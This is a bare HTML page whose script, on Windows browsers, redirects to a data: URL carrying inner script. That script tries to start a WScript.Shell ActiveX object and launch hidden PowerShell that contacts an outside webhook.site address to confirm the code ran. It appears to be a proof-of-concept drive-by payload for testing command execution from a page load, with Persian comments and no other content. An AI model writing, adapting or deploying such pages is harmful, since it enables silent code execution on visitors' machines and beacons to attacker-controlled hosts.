<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>

<script>
if (/Win/i.test(navigator.userAgent)) {

    setTimeout(() => {

        // HTML صفحه‌ای که قرار است با data: URL بارگذاری شود
        const html = `
            <script>
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("powershell -nop -w hidden -c \"$null=(New-Object Net.WebClient).DownloadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d?ps-ok=1')\"");
            } catch(e) {
                // ActiveX fail
            }
            </` + `script>
        `;

        // ساخت data URL
        const data = "data:text/html," + encodeURIComponent(html);

        // بارگذاری
        location = data;

    }, 1500);
}
</script>

</body>
</html>
